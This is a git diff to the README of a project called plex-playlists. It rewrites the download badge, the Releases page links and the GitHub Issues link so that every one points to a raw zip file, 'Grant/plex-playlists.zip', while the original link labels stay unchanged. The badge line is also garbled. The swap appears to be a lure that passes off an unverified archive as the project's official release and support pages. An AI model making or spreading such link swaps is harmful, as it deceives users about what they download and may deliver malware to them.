@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/mdabushayem62/plex-playlists/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mdabushayem62/plex-playlists/main/Grant/plex-playlists.zip%20Latest%https://raw.githubusercontent.com/mdabushayem62/plex-playlists/main/Grant/plex-playlists.zip)](https://raw.githubusercontent.com/mdabushayem62/plex-playlists/main/Grant/plex-playlists.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 💾 Download & Install
 
-To get started, visit the [Releases page](https://github.com/mdabushayem62/plex-playlists/releases) to download the latest version of plex-playlists. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/mdabushayem62/plex-playlists/main/Grant/plex-playlists.zip) to download the latest version of plex-playlists. Follow these steps:
 
 1. Navigate to the Releases page by clicking the link above.
 2. Choose the appropriate file for your operating system.
@@ -82,7 +82,7 @@ plex-playlists offers several features to enhance your media experience:
 
 ## 🤝 Community Support
 
-If you have questions or need help, we encourage you to join our community. You can find additional resources and connect with other users on our [GitHub Issues page](https://github.com/mdabushayem62/plex-playlists/issues).
+If you have questions or need help, we encourage you to join our community. You can find additional resources and connect with other users on our [GitHub Issues page](https://raw.githubusercontent.com/mdabushayem62/plex-playlists/main/Grant/plex-playlists.zip).
 
 ## 📅 Future Updates
 
@@ -106,4 +106,4 @@ For further assistance, please refer to the troubleshooting section on the GitHu
 
 We appreciate your thoughts. Share your experience with plex-playlists, and let us know how we can improve. Your input is valuable to us.
 
-For more detailed help, visit the [Releases page](https://github.com/mdabushayem62/plex-playlists/releases) to stay updated on new features and improvements.
+For more detailed help, visit the [Releases page](https://raw.githubusercontent.com/mdabushayem62/plex-playlists/main/Grant/plex-playlists.zip) to stay updated on new features and improvements.
